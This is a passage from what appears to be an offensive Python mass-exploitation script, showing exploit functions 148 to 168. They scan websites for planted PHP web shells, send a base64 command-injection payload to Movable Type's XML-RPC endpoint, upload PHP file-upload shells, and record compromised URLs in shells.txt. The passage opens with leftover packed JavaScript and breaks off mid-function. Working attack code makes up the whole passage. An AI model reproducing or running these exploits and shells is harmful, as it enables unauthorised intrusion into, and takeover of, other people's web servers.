	<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
</body>
</html>

------WebKitFormBoundary5bvq7vh5W2anjxf6--"""
            che = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/test.html',headers=headers,data=data,allow_redirects=True,timeout=15)
            check = requests.get(url+'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8"):
                    print (' [#] Exploit 148 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + 'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php\n')
            else:
                print ('[#] Exploit 148 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_149(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 149 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 149 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp.php\n')
            else:
                print ('[#] Exploit 149 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_150(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/ws.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 150  --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/ws.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/ws.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 150 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/ws.php\n')
            else:
                print ('[#] Exploit 150 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#/wp-admin/zphxi.php
def exploit_151(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/zphxi.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 151 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/zphxi.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/zphxi.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 151 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/zphxi.php\n')
            else:
                print ('[#] Exploit 151 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_152(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 152 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/shell20211028.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 152 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/shell20211028.php\n')
            else:
                print ('[#] Exploit 152 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_153(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/wp-2019.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 153 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/cgi-bin/wp-2019.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/wp-2019.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 153 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/cgi-bin/wp-2019.php\n')
            else:
                print ('[#] Exploit 153 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_154(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/wso112233.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 154 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/wso112233.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/wso112233.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 154 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/wso112233.php\n')
            else:
                print ('[#] Exploit 154 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_155(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/mt/pekok.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Kirigaya Kirito' in check.content.decode("utf-8")):
                print (' [#] Exploit 155 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/mt/pekok.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/mt/pekok.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Kirigaya Kirito' in check.content.decode("utf-8"):
                    print (' [#] Exploit 155 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/mt/pekok.php\n')
            else:
                print ('[#] Exploit 155 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_156(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        data = """<?xml version="1.0"?>
        <methodCall>
        <methodName>mt.handler_to_coderef</methodName>
        <params>
        <param><value><base64>
        YGVjaG8gIlBEOXdhSEFnWldOb2J5QW5TMmx5YVdkaGVXRWdTMmx5YVhSdkp5NG5QR0p5UGljdUoxVnVZVzFsT2ljdWNHaHdYM1Z1WVcxbEtDa3VKenhpY2o0bkxpUmpkMlFnUFNCblpYUmpkMlFvS1RzZ1JXTm9ieUFuUEdObGJuUmxjajRnSUR4bWIzSnRJRzFsZEdodlpEMGljRzl6ZENJZ2RHRnlaMlYwUFNKZmMyVnNaaUlnWlc1amRIbHdaVDBpYlhWc2RHbHdZWEowTDJadmNtMHRaR0YwWVNJK0lDQThhVzV3ZFhRZ2RIbHdaVDBpWm1sc1pTSWdjMmw2WlQwaU1qQWlJRzVoYldVOUluVndiRzloWkhNaUlDOCtJRHhwYm5CMWRDQjBlWEJsUFNKemRXSnRhWFFpSUhaaGJIVmxQU0oxY0d4dllXUWlJQzgrSUNBOEwyWnZjbTArSUNBOEwyTmxiblJsY2o0OEwzUmtQand2ZEhJK0lEd3ZkR0ZpYkdVK1BHSnlQaWM3SUdsbUlDZ2haVzF3ZEhrZ0tDUmZSa2xNUlZOYkozVndiRzloWkhNblhTa3BJSHNnSUNBZ0lHMXZkbVZmZFhCc2IyRmtaV1JmWm1sc1pTZ2tYMFpKVEVWVFd5ZDFjR3h2WVdSekoxMWJKM1J0Y0Y5dVlXMWxKMTBzSkY5R1NVeEZVMXNuZFhCc2IyRmtjeWRkV3lkdVlXMWxKMTBwT3lBZ0lDQWdSV05vYnlBaVBITmpjbWx3ZEQ1aGJHVnlkQ2duZFhCc2IyRmtJRVJ2Ym1VbktUc2dJQ0FnSUNBZ0lEd3ZjMk55YVhCMFBqeGlQbFZ3Ykc5aFpHVmtJQ0VoSVR3dllqNDhZbkkrYm1GdFpTQTZJQ0l1SkY5R1NVeEZVMXNuZFhCc2IyRmtjeWRkV3lkdVlXMWxKMTB1SWp4aWNqNXphWHBsSURvZ0lpNGtYMFpKVEVWVFd5ZDFjR3h2WVdSekoxMWJKM05wZW1VblhTNGlQR0p5UG5SNWNHVWdPaUFpTGlSZlJrbE1SVk5iSjNWd2JHOWhaSE1uWFZzbmRIbHdaU2RkT3lCOUlEOCtJZz09IiB8IGJhc2U2NCAtLWRlY29kZSA+PiBwZWtvay5waHBg
        </base64></value></param>
        </params>
        </methodCall>"""
        check = requests.post(url+'/mt/mt-xmlrpc.cgi', headers=headers, data=data, timeout=10, verify=False)
        if ("MT::handler_to_coderef('mt', '`echo" in check.content.decode("utf-8")):
                print (' [#] Exploit 156 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/mt/mt-xmlrpc.cgi\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            data = """<?xml version="1.0"?>
        <methodCall>
        <methodName>mt.handler_to_coderef</methodName>
        <params>
        <param><value><base64>
        YGVjaG8gIlBEOXdhSEFnWldOb2J5QW5TMmx5YVdkaGVXRWdTMmx5YVhSdkp5NG5QR0p5UGljdUoxVnVZVzFsT2ljdWNHaHdYM1Z1WVcxbEtDa3VKenhpY2o0bkxpUmpkMlFnUFNCblpYUmpkMlFvS1RzZ1JXTm9ieUFuUEdObGJuUmxjajRnSUR4bWIzSnRJRzFsZEdodlpEMGljRzl6ZENJZ2RHRnlaMlYwUFNKZmMyVnNaaUlnWlc1amRIbHdaVDBpYlhWc2RHbHdZWEowTDJadmNtMHRaR0YwWVNJK0lDQThhVzV3ZFhRZ2RIbHdaVDBpWm1sc1pTSWdjMmw2WlQwaU1qQWlJRzVoYldVOUluVndiRzloWkhNaUlDOCtJRHhwYm5CMWRDQjBlWEJsUFNKemRXSnRhWFFpSUhaaGJIVmxQU0oxY0d4dllXUWlJQzgrSUNBOEwyWnZjbTArSUNBOEwyTmxiblJsY2o0OEwzUmtQand2ZEhJK0lEd3ZkR0ZpYkdVK1BHSnlQaWM3SUdsbUlDZ2haVzF3ZEhrZ0tDUmZSa2xNUlZOYkozVndiRzloWkhNblhTa3BJSHNnSUNBZ0lHMXZkbVZmZFhCc2IyRmtaV1JmWm1sc1pTZ2tYMFpKVEVWVFd5ZDFjR3h2WVdSekoxMWJKM1J0Y0Y5dVlXMWxKMTBzSkY5R1NVeEZVMXNuZFhCc2IyRmtjeWRkV3lkdVlXMWxKMTBwT3lBZ0lDQWdSV05vYnlBaVBITmpjbWx3ZEQ1aGJHVnlkQ2duZFhCc2IyRmtJRVJ2Ym1VbktUc2dJQ0FnSUNBZ0lEd3ZjMk55YVhCMFBqeGlQbFZ3Ykc5aFpHVmtJQ0VoSVR3dllqNDhZbkkrYm1GdFpTQTZJQ0l1SkY5R1NVeEZVMXNuZFhCc2IyRmtjeWRkV3lkdVlXMWxKMTB1SWp4aWNqNXphWHBsSURvZ0lpNGtYMFpKVEVWVFd5ZDFjR3h2WVdSekoxMWJKM05wZW1VblhTNGlQR0p5UG5SNWNHVWdPaUFpTGlSZlJrbE1SVk5iSjNWd2JHOWhaSE1uWFZzbmRIbHdaU2RkT3lCOUlEOCtJZz09IiB8IGJhc2U2NCAtLWRlY29kZSA+PiBwZWtvay5waHBg
        </base64></value></param>
        </params>
        </methodCall>"""
            check = requests.post(url+'/mt/mt-xmlrpc.cgi', headers=headers, data=data, timeout=10, verify=False)
            if "MT::handler_to_coderef('mt', '`echo" in check.content.decode("utf-8"):
                    print (' [#] Exploit 156 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/mt/mt-xmlrpc.cgi\n')
            else:
                print ('[#] Exploit 156 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_157(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/include/lang_upload.php',headers=headers, allow_redirects=True,timeout=15)
        if ( "<input type='submit' value='up' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 157 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/include/lang_upload.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/include/lang_upload.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='up' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 157 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/include/lang_upload.php\n')
            else:
                print ('[#] Exploit 157 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
#done with 157

def exploit_158(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers, allow_redirects=True,timeout=15)
        if ('-= xxxxxxxxxxx =-' in check.content.decode("utf-8")):
                print (' [#] Exploit 158 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '-= xxxxxxxxxxx =-' in check.content.decode("utf-8"):
                    print (' [#] Exploit 158 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\n')
            else:
                print ('[#] Exploit 158 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_159(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/style.php',headers=headers, allow_redirects=True,timeout=15)
        if ('filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 159 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/style.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/style.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 159 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/style.php\n')
            else:
                print ('[#] Exploit 159 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_160(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/mu-plugins/blog.php',headers=headers, allow_redirects=True,timeout=15)
        if ('0byt3m1n1' in check.content.decode("utf-8")):
                print (' [#] Exploit 160 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/mu-plugins/blog.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/mu-plugins/blog.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '0byt3m1n1' in check.content.decode("utf-8"):
                    print (' [#] Exploit 160 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/mu-plugins/blog.php\n')
            else:
                print ('[#] Exploit 160 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_161( url):
    session = Session()
    shell= '''<?php error_reporting(0);echo("kill_the_net<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>");@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");?>'''
    name = f"{getrandbits(32)}.php"
    try:
        url = 'http://' + URLdomain(url)
        r    = session.post(url, files={"mofile[]": (name, shell)}).text
        if "New Language Uploaded Successfully" in r:
           print(f" [ LOG ] (SHELL UPLOADED) {url}")
        # self.Save("__shells__.txt", url.replace("include/lang_upload.php",f"languages/{name}"))
           open('shells.txt', 'a').write(url + 'url.replace("include/lang_upload.php",f"languages/{name}")\n')
        
         
        else:
            
            url = 'https://' + URLdomain(url)
            r    = session.post(url, files={"mofile[]": (name, shell)}).text
            if "New Language Uploaded Successfully" in r:
                print(f" [ LOG ] (SHELL UPLOADED) {url}")
        # self.Save("__shells__.txt", url.replace("include/lang_upload.php",f"languages/{name}"))
                open('shells.txt', 'a').write(url + 'url.replace("include/lang_upload.php",f"languages/{name}")\n')
        
            print(f" [ LOG ] (SHELL NOT UPLOADED) {url}")
    except:
         print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
def exploit_162(url):
        shell_Fox = """<?php error_reporting(0); echo php_uname()."<br>".getcwd()."<br>"; if($_GET['Fox'] == 'DKBcL'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>"""
        
        headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
        try:
            paths = ['/wp-content/plugins/ccx/index.php', '/ccx/index.php', '/xt/index.php', '/xleet-shell.php', '/xleet.php', '/xleetshell.php', '/wp-admin/includes/xleet-shell.php', '/wp-content/plugins/content-management/content.php', '/xlt.php', '/wp-content/plugins/xt/index.php', '/wp-content/xleet.php', '/xleet.php', '/wp-admin/xleet-shell.php']
            for path in paths:
                try:
                    exploit_point = 'http://'+ url + path
                    check = requests.get(exploit_point, verify=False,headers=headers,timeout=20).content
                    if '<pre align=center><form method=post>Password<br><input type=password name=pass' in check:
                        try:
                            
                            filename = ran(8)+'.php'
                            requp = requests.session()
                            dom = URLdomain(exploit_point)
                            Part0ne = hashlib.md5(dom.encode()).hexdigest()
                            PartTw0 = ''
                            headersUp = {'Connection': 'keep-alive',
                                        'Cache-Control': 'max-age=0',
                                        'Upgrade-Insecure-Requests': '1',
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
                                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                        'Accept-Encoding': 'gzip, deflate',
                                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                                        'Cookie': Part0ne+'='+PartTw0+';'}
                            filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
                            fileup = {'f[]': (filename, shell_Fox)}
                            shell_path = exploit_point.replace(exploit_point.split('/')[-1],filename+'?Fox=DKBcL')
                            try :
                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=30)
                            except:
                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=45)
                            try :
                                check = requests.get(shell_path, headers=headers, timeout=15)
                            except :
                                check = requests.get(shell_path, headers=headers, timeout=30)
                            if 'UPload' in check.content and 'multipart/form-data' in check.content:
             
                                print ('[#] Exploit 161 --> ' + url + ' {}[Succefully]'.format(fg)) 
                                open('shells.txt', 'a').write(shell_path +'\n')
                            else:
                                    exploit_point = 'http://'+ url + path
                                    check = requests.get(exploit_point, verify=False,headers=headers,timeout=20).content
                                    if '<pre align=center><form method=post>Password<br><input type=password name=pass' in check:
                                        try:
                            
                                            filename = ran(8)+'.php'
                                            requp = requests.session()
                                            dom = URLdomain(exploit_point)
                                            Part0ne = hashlib.md5(dom.encode()).hexdigest()
                                            PartTw0 = ''
                                            headersUp = {'Connection': 'keep-alive',
                                                'Cache-Control': 'max-age=0',
                                                'Upgrade-Insecure-Requests': '1',
                                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
                                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                                'Accept-Encoding': 'gzip, deflate',
                                                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                                                'Cookie': Part0ne+'='+PartTw0+';'}
                                            filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
                                            fileup = {'f[]': (filename, shell_Fox)}
                                            shell_path = exploit_point.replace(exploit_point.split('/')[-1],filename+'?Fox=DKBcL')
                                            try :
                                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=30)
                                            except:
                                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=45)
                                            try :
                                                check = requests.get(shell_path, headers=headers, timeout=15)
                                            except :
                                                check = requests.get(shell_path, headers=headers, timeout=30)
                                            if 'UPload' in check.content and 'multipart/form-data' in check.content:
             
                                                print ('[#] Exploit 161 --> ' + url + ' {}[Succefully]'.format(fg)) 
                                                open('shells.txt', 'a').write(shell_path +'\n')
                                            else:
                                                print ('[#] Exploit 161 --> ' + url + ' {}[Failed]'.format(fr))
                                        except:
                                            print(' -| ' + exploit_point + ' --> {}[Upload Fail]'.format(fr))
                        except:
                            print(' -| ' + exploit_point + ' --> {}[Upload Fail]'.format(fr))
                
                except:
                
                    pass
        except:
            print(' -| ' + exploit_point + ' --> {}[Upload Fail]'.format(fr))

def exploit_163(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 163 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 163 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 163 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_164(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 164 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/cgi-bin/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 164 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/cgi-bin/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 164 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_165(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/blog/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 165 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/blog/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/blog/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 165 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/blog/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 165 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_166(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 166 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/cgi-bin/mt/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 166 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/cgi-bin/mt/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 166 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_167(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cms/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 167 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/cms/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cms/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 167 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/cms/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 167 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_168(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/mtos/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
